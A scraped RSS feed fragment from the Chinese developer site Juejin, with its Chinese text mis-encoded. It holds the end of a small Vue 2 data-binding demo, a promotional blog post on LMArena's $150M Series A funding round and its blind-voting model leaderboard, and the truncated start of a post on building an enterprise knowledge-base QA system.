<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'app'</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-once</span>&gt;</span>ç”¨æˆ·åï¼š{{ username }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"username"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcss.com/vue/2.6.10/vue.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>:{
        <span class="hljs-attr">username</span>: <span class="hljs-string">'åä¸‰'</span>
      }
    })
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2aca6daf0ddf41faa07f4879e6e69a13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=%2BURDIOA774rTCXtbSVbCRsYN9rA%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç»™ AI æ‰“ä¸ªåˆ†ï¼Œå°±èƒ½æå‡ºä¼°å€¼17äº¿ç‹¬è§’å…½ï¼Ÿï¼Ÿåˆšåˆšå®Œæˆ1.5äº¿ç¾å…ƒAè½®èèµ„ï¼Œè¿™ä¸ªAI è¯„æµ‹å¹³å°å½»åº•ç«äº†ï¼LMArena]]></title>    <link>https://juejin.cn/post/7592531796043923471</link>    <guid>https://juejin.cn/post/7592531796043923471</guid>    <pubDate>2026-01-08T02:38:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592531796043923471" data-draft-id="7592524811860688930" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç»™ AI æ‰“ä¸ªåˆ†ï¼Œå°±èƒ½æå‡ºä¼°å€¼17äº¿ç‹¬è§’å…½ï¼Ÿï¼Ÿåˆšåˆšå®Œæˆ1.5äº¿ç¾å…ƒAè½®èèµ„ï¼Œè¿™ä¸ªAI è¯„æµ‹å¹³å°å½»åº•ç«äº†ï¼LMArena"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T02:38:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é’æ¢…ä¸»ç "/> <meta itemprop="url" content="https://juejin.cn/user/2277843825604222"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç»™ AI æ‰“ä¸ªåˆ†ï¼Œå°±èƒ½æå‡ºä¼°å€¼17äº¿ç‹¬è§’å…½ï¼Ÿï¼Ÿåˆšåˆšå®Œæˆ1.5äº¿ç¾å…ƒAè½®èèµ„ï¼Œè¿™ä¸ªAI è¯„æµ‹å¹³å°å½»åº•ç«äº†ï¼LMArena
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2277843825604222/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é’æ¢…ä¸»ç 
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:38:27.000Z" title="Thu Jan 08 2026 02:38:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ å¥½ï¼Œæˆ‘æ˜¯<strong>æ°å“¥</strong>ã€‚</p>
<p>2026å¹´å¼€å¹´æ²¡å‡ å¤©ï¼ŒAI åœˆåˆçˆ†å‡ºä¸€ä¸ªå¤§æ–°é—»ï¼šé‚£ä¸ªè®©æˆ‘ä»¬å¤©å¤©åˆ·å¤§æ¨¡å‹æ’åçš„ <strong>LMArena</strong>ï¼ˆå‰èº« <strong>Chatbot Arena</strong>ï¼‰ï¼Œæ­£å¼å®£å¸ƒå®Œæˆ <strong>1.5 äº¿ç¾å…ƒAè½®èèµ„</strong>ï¼Œèèµ„åä¼°å€¼ç›´æ¥é£™åˆ°<strong>17 äº¿ç¾å…ƒ</strong>ï¼Œå¦¥å¦¥æˆä¸ºAIç‹¬è§’å…½ï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f5c60ec1c50401282b7c091f3a242d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S5qKF5Li756CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444706&amp;x-signature=PSdmk%2FJsHHHakpoBCi%2FRlNnlZOg%3D" alt="image.png" loading="lazy"/></p>
<p>ä»ä¸€ä¸ªå¤§å­¦å®éªŒå®¤çš„å¼€æºé¡¹ç›®ï¼Œåˆ°å¦‚ä»Šä¼°å€¼ 17äº¿çš„å•†ä¸šå…¬å¸ï¼Œ<strong>LMArena</strong> åªç”¨äº†ä¸åˆ°ä¸‰å¹´æ—¶é—´ã€‚</p>
<p>è¿™æ³¢æ“ä½œï¼ŒçœŸçš„è®©äººæ„Ÿå¹ï¼šåŸæ¥ç»™ AI æ¨¡å‹â€œæ‰“åˆ†â€ï¼Œä¹Ÿèƒ½æ‰“å‡ºä¸Šäº¿èº«å®¶ï¼</p>
<p>ä»Šå¤©æˆ‘ä»¬å°±æ¥èŠèŠè¿™ä¸ªç°è±¡çº§ AI è¯„æµ‹å¹³å°ï¼Œçœ‹çœ‹å®ƒåˆ°åº•å‡­ä»€ä¹ˆè¿™ä¹ˆç‰›ã€‚</p>
<h2 data-id="heading-0">ä»å­¦æœ¯ç©å…·åˆ°è¡Œä¸šæ ‡æ†ï¼šLMArenaçš„é€†è¢­ä¹‹è·¯</h2>
<p><strong>LMArena</strong> çš„å‰èº«æ˜¯ <strong>LMSYS Org</strong> æ¨å‡ºçš„ <strong>Chatbot Arena</strong>ï¼Œæœ€æ—©åªæ˜¯ UC ä¼¯å…‹åˆ©ç­‰é«˜æ ¡ç ”ç©¶è€…æçš„ä¸€ä¸ªå°å®éªŒã€‚</p>
<p>2023 å¹´ ChatGPT ç«äº†ä¹‹åï¼Œå¤§å®¶å‘ç°ä¼ ç»ŸåŸºå‡†æµ‹è¯•ï¼ˆåƒ <strong>MMLUã€HumanEval</strong>ï¼‰æ ¹æœ¬æµ‹ä¸å‡ºæ¨¡å‹çœŸå®æ°´å¹³â€”â€”åšé¢˜å¼ºï¼Œä¸ä»£è¡¨èŠå¤©å¥½ç”¨ã€‚</p>
<p>äºæ˜¯ <strong>LMSYS</strong> å›¢é˜Ÿçµæœºä¸€åŠ¨ï¼šå¹²è„†è®©ç”¨æˆ·ç›´æ¥ç›²æµ‹æŠ•ç¥¨å§ï¼</p>
<p>ç”¨æˆ·è¾“å…¥åŒä¸€ä¸ªé—®é¢˜ï¼Œä¸¤ä¸ªåŒ¿åæ¨¡å‹åŒæ—¶å›ç­”ï¼Œä½ æŠ•ç¥¨é€‰å“ªä¸ªæ›´å¥½ï¼ŒæŠ•ç¥¨å®Œå†æ­æ™“æ˜¯è°å¯¹è°ã€‚</p>
<p>è¿™ç§â€œ<strong>ä¼—åŒ…+åŒç›²+Eloè¯„åˆ†</strong>â€çš„æ¨¡å¼ï¼Œä¸€ä¸‹å­å°±ç«äº†ã€‚</p>
<p>çŸ­çŸ­å‡ å¹´ï¼š</p>
<ul>
<li>ç´¯è®¡è¶…è¿‡<strong>5000ä¸‡å¼ ç”¨æˆ·æŠ•ç¥¨</strong></li>
<li>è¯„ä¼°äº†<strong>400å¤šä¸ª</strong>å¼€æºå’Œé—­æºæ¨¡å‹</li>
<li>å¼€æºäº†<strong>14.5ä¸‡ä¸ª</strong>é«˜è´¨é‡å¯¹æˆ˜æ•°æ®</li>
<li>æ”¯æŒæ–‡æœ¬ã€è§†è§‰ã€å›¾åƒç”Ÿæˆã€è§†é¢‘ç­‰å¤šæ¨¡æ€è¯„æµ‹</li>
</ul>
<p>ç°åœ¨ï¼Œæ–°æ¨¡å‹ä¸€å‘å¸ƒï¼Œç¬¬ä¸€ä»¶äº‹å°±æ˜¯å†²åˆ° <strong>LMArena</strong> çœ‹æ’åã€‚**Geminiã€Claudeã€Grokã€DeepSeekâ€¦â€¦**å“ªä¸ªæ²¡åœ¨è¿™é‡Œè¢«ç”¨æˆ·â€œæ‹·æ‰“â€è¿‡ï¼Ÿ</p>
<p>å®ƒå·²ç»æˆäº†AIè¡Œä¸šçš„â€œé»„é‡‘æ ‡å‡†â€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31bb7463e7ec490bba241a7f93e6b883~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S5qKF5Li756CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444706&amp;x-signature=ixB8uCIX%2BQq48jgg%2FuL2OWVkFEs%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">é‡ç£…èèµ„ç»†èŠ‚ï¼šå¤§ä½¬ä»¬é›†ä½“All in</h2>
<p>è¿™æ¬¡Aè½®èèµ„è§„æ¨¡<strong>1.5äº¿ç¾å…ƒ</strong>ï¼Œç”±<strong>Felicis</strong>å’Œ<strong>åŠ å·å¤§å­¦æŠ•èµ„å…¬å¸UC Investments</strong>é¢†æŠ•ï¼Œ<strong>a16zï¼ˆAndreessen Horowitzï¼‰ã€Kleiner Perkinsã€Lightspeed Venture Partners</strong>ç­‰ä¸€ä¼—é¡¶çº§VCè·ŸæŠ•ã€‚</p>
<p>è¦çŸ¥é“ï¼Œ2025 å¹´ 5 æœˆå®ƒæ‰åˆšæ‹¿äº† 1 äº¿ç¾å…ƒç§å­è½®ï¼Œå½“æ—¶ä¼°å€¼ 6 äº¿ã€‚</p>
<p>çŸ­çŸ­ 8ä¸ªæœˆï¼Œä¼°å€¼ç›´æ¥ç¿»äº†è¿‘ 3å€ï¼</p>
<p>å›¢é˜Ÿè¡¨ç¤ºï¼Œè¿™ç¬”é’±å°†ç”¨æ¥ï¼š</p>
<ul>
<li>åŠ é€Ÿå¼€å‘æ–°åŠŸèƒ½</li>
<li>æå‡ç”¨æˆ·ä½“éªŒ</li>
<li>æ‰©å¤§å›¢é˜Ÿè§„æ¨¡</li>
<li>ç»§ç»­ä¿æŒç¤¾åŒºé©±åŠ¨çš„å¼€æ”¾ç²¾ç¥</li>
</ul>
<p>åˆ›å§‹äººå›¢é˜ŸåŸºæœ¬éƒ½æ˜¯ä¼¯å…‹åˆ©ã€æ–¯å¦ç¦ã€CMUç­‰é¡¶æ ¡çš„90ååäººç ”ç©¶å‘˜ï¼ŒæŠ€æœ¯ç¡¬æ ¸ï¼Œä½è°ƒåŠ¡å®ã€‚</p>
<p>å®˜æ–¹å…¬å‘Šé‡Œè¿˜ç‰¹åˆ«æ„Ÿè°¢ç¤¾åŒºï¼šæ²¡æœ‰å¤§å®¶çš„ <strong>5000ä¸‡</strong>å¼ æŠ•ç¥¨ï¼Œå°±æ²¡æœ‰ä»Šå¤©çš„ <strong>LMArena</strong>ã€‚</p>
<h2 data-id="heading-2">ä¸ºä»€ä¹ˆLMArenaè¿™ä¹ˆé‡è¦ï¼Ÿ</h2>
<p>ä¼ ç»ŸåŸºå‡†æ˜¯â€œè€ƒè¯•å¼â€æµ‹åˆ†ï¼ŒLMArenaæ˜¯â€œæ“‚å°å¼â€çœŸäººPKã€‚</p>
<p>ä¼˜åŠ¿æ˜¾è€Œæ˜“è§ï¼š</p>
<ol>
<li><strong>çœŸå®ç”¨æˆ·åå¥½</strong>ï¼šåæ˜ çœŸå®ä½¿ç”¨åœºæ™¯ï¼Œè€Œä¸æ˜¯å®éªŒå®¤æ•°æ®</li>
<li><strong>å…¬å¹³åŒç›²</strong>ï¼šé¿å…å“ç‰Œå…‰ç¯å½±å“ï¼ˆå¾ˆå¤šäººä¸€çœ‹åˆ°GPTå°±æŠ•å®ƒï¼‰</li>
<li><strong>åŠ¨æ€æ’è¡Œ</strong>ï¼šEloè¯„åˆ†å®æ—¶æ›´æ–°ï¼Œæ–°æ¨¡å‹éšæ—¶èƒ½å†²æ¦œ</li>
<li><strong>å¤šæ¨¡æ€æ”¯æŒ</strong>ï¼šä¸æ­¢èŠå¤©ï¼Œè¿˜èƒ½æ¯”ç”»å›¾ã€çœ‹å›¾ã€å†™ä»£ç </li>
</ol>
<p>å®ƒä¸ä»…å¸®ç”¨æˆ·é€‰æ¨¡å‹ï¼Œè¿˜ç»™å¼€å‘è€…æä¾›äº†æœ€å®è´µçš„åé¦ˆæ•°æ®ï¼Œæ¨åŠ¨æ•´ä¸ªè¡Œä¸šè¿›æ­¥ã€‚</p>
<h4 data-id="heading-3">äº²æµ‹ä½“éªŒï¼šä¸¤åˆ†é’Ÿä¸Šç˜¾ï¼Œæ ¹æœ¬åœä¸ä¸‹æ¥</h4>
<p>æˆ‘ç¬¬ä¸€æ—¶é—´å»å®˜ç½‘ <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Flmarena.ai%2F" target="_blank" title="https://lmarena.ai/" ref="nofollow noopener noreferrer">lmarena.ai/</a></strong> è¯•ç©äº†<strong>Battleæ¨¡å¼</strong>ï¼ŒçœŸçš„å¤ªçˆ½äº†ï¼</p>
<p><strong>ä½“éªŒ1ï¼šç»å…¸ç›²æµ‹å¯¹æˆ˜</strong></p>
<p>ç‚¹å¼€â€œNew Chatâ€ â†’ é€‰æ‹©â€œBattleâ€æ¨¡å¼ï¼Œè¾“å…¥é—®é¢˜ï¼šâ€œå¸®æˆ‘å†™ä¸€é¦–å…³äº2026å¹´AIç‹¬è§’å…½çš„æ‰“æ²¹è¯—ã€‚â€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c38e01d607d47fca2fe67ffa72132cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S5qKF5Li756CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444706&amp;x-signature=VdnwcMbzwkYNXIZPTRXBzT%2FTrJ8%3D" alt="image.png" loading="lazy"/></p>
<p>ä¸¤ä¸ªåŒ¿åæ¨¡å‹ï¼ˆå·¦Model Aï¼Œå³Model Bï¼‰åŒæ—¶ç»™å‡ºç­”æ¡ˆã€‚</p>
<p>ä¸€ä¸ªè¯—å†™å¾—æŠ¼éŸµå¹½é»˜ï¼Œä¸€ä¸ªæ›´ç»“æ„åŒ–ä½†å¹³æ·¡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afcd8f6e054a4e41a79b798867da7a47~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S5qKF5Li756CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444706&amp;x-signature=5lcrlNuSmElSgjcNsfAT1nGg0sE%3D" alt="image.png" loading="lazy"/></p>
<p>æˆ‘æœæ–­æŠ•äº†å·¦è¾¹æ›´å¥½â€”â€”æ­æ™“ï¼å·¦è¾¹å±…ç„¶æ˜¯ <strong>claude-ops-4.1</strong>ï¼Œå³è¾¹æ˜¯ <strong>gpt-5.1</strong>ã€‚</p>
<p>ç¬é—´æœ‰ç§â€œäººæ°‘çš„åŠ›é‡â€çš„æˆå°±æ„Ÿï¼</p>
<p><strong>ä½“éªŒ2ï¼šå›¾åƒç”Ÿæˆæ“‚å°</strong></p>
<p>åˆ‡æ¢åˆ° <strong>Text-to-Image Arena</strong>ï¼Œè¾“å…¥æç¤ºè¯ï¼šâ€œä¸€åªå¸¦ç€çœ¼ç›çš„æ³¢æ–¯çŒ«åœ¨éœ“è™¹éƒ½å¸‚é£é©°â€ã€‚</p>
<p>ä¸¤ä¸ªæ¨¡å‹ç”Ÿæˆçš„å›¾åŒæ—¶å±•ç¤ºï¼Œæˆ‘æŠ•äº†æ›´é…·çš„é‚£å¼ ã€‚</p>
<p>æŠ•ç¥¨å®Œè¿˜èƒ½çœ‹åˆ°è¯¦ç»†æ’åå’Œå†å²å¯¹æˆ˜è®°å½•ã€‚</p>
<p><strong>ä½“éªŒ3ï¼šæŸ¥çœ‹æ’è¡Œæ¦œ</strong></p>
<p><strong>Leaderboard</strong> é¡µé¢è¶…çº§æ¸…æ™°ï¼Œæ–‡æœ¬ã€è§†è§‰ã€ç¡¬æ ¸æ¨ç†ç­‰å¤šç»´åº¦æ’è¡Œä¸€ç›®äº†ç„¶ã€‚ç›®å‰æ¦œé¦–è¿˜æ˜¯é‚£äº›ç†Ÿæ‚‰çš„åå­—ï¼Œä½†æ–°æ¨¡å‹éšæ—¶å¯èƒ½é€†è¢­ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b06f2a646d324e859bf381c408447256~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S5qKF5Li756CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444706&amp;x-signature=ltFXJFSTzmnfHjKifgXriBglgbE%3D" alt="image.png" loading="lazy"/></p>
<p>æ€»ä¹‹ï¼Œç”¨ä¸‹æ¥åªæƒ³è¯´ï¼š**è¿™æ‰æ˜¯æœ€å…¬å¹³ã€æœ€å¥½ç©çš„AI è¯„æµ‹æ–¹å¼ï¼**æ¯å¤©åˆ·ä¸€åˆ·ï¼ŒåŸºæœ¬å°±èƒ½çŸ¥é“å“ªä¸ªæ¨¡å‹æœ€å¼ºã€‚</p>
<h4 data-id="heading-4">å†™åœ¨æœ€åï¼šAIè¯„æµ‹çš„æœªæ¥ï¼Œå·²ç»æ¥äº†</h4>
<p><strong>LMArena</strong> çš„çˆ†ç«ï¼Œè¯´æ˜ä¸€ä¸ªé“ç†ï¼š<strong>AI æ—¶ä»£ï¼Œå…‰æœ‰æ¨¡å‹ä¸å¤Ÿï¼Œè¿˜å¾—æœ‰é è°±çš„â€œè£åˆ¤â€</strong>ã€‚</p>
<p>å®ƒä¸ä»…å¸®æˆ‘ä»¬æ™®é€šç”¨æˆ·é€‰åˆ°æœ€å¥½ç”¨çš„ AIï¼Œè¿˜åœ¨æ¨åŠ¨æ•´ä¸ªè¡Œä¸šå‘æ›´é€æ˜ã€æ›´è´Ÿè´£çš„æ–¹å‘å‘å±•ã€‚</p>
<p>èèµ„æˆåŠŸåï¼Œ<strong>LMArena</strong> ä¼šå˜å¾—æ›´å¼ºâ€”â€”æ›´å¤šæ¨¡æ€ã€æ›´å¤šåŠŸèƒ½ã€æ›´å¥½ä½“éªŒã€‚</p>
<p>ä½ è¿˜åœ¨ç­‰ä»€ä¹ˆï¼Ÿ</p>
<p>èµ¶ç´§å» <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Flmarena.ai%2F" target="_blank" title="https://lmarena.ai/" ref="nofollow noopener noreferrer">lmarena.ai/</a></strong> å¼€æŠ•ï¼å¤šæŠ•å‡ ç¥¨ï¼Œä½ å°±æ˜¯ AI è¿›æ­¥çš„æ¨åŠ¨è€…ï½</p>
<h2 data-id="heading-5">æœ€å</h2>
<p>å…³æ³¨å…¬ä¼—å·ã€AIä¿¡æ¯é£å‘ã€‘ï¼Œå›å¤ 666ï¼Œå³å¯è·å–æ›´å¤š AI è¡Œä¸šæŠ¥å‘Šå’Œ AI å‰æ²¿å·¥å…·ã€‚</p>
<p>AI æŠ€æœ¯æ­£ä»¥å‰æ‰€æœªæœ‰çš„é€Ÿåº¦å‘å±•ï¼Œå®ƒå°†å¦‚ä½•å¡‘é€ æˆ‘ä»¬çš„æœªæ¥ï¼Ÿè®©æˆ‘ä»¬æ‹­ç›®ä»¥å¾…ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»éœ€æ±‚åˆ°è½åœ°ï¼šæˆ‘ä»¬æ˜¯å¦‚ä½•æ­å»ºä¼ä¸šçŸ¥è¯†åº“é—®ç­”ç³»ç»Ÿçš„]]></title>    <link>https://juejin.cn/post/7592508079305736211</link>    <guid>https://juejin.cn/post/7592508079305736211</guid>    <pubDate>2026-01-08T02:44:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592508079305736211" data-draft-id="7592483877987368966" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»éœ€æ±‚åˆ°è½åœ°ï¼šæˆ‘ä»¬æ˜¯å¦‚ä½•æ­å»ºä¼ä¸šçŸ¥è¯†åº“é—®ç­”ç³»ç»Ÿçš„"/> <meta itemprop="keywords" content="åç«¯,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-08T02:44:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" 